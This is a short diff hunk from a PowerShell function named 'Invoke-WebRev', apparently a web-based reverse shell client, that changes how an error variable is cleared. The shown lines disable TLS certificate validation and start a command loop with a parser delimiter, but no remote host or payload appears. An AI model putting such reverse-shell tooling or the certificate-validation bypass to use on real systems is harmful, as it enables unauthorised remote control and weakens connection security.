@@ -41,7 +41,7 @@ function Invoke-WebRev{
     [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;
     [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
     $pwd = "pwd | Format-Table -HideTableHeaders";
-    $error[0] = "";
+    $error[0] = $null;
     $parser = "|||P4RS3R|||";
 
     while ($true)
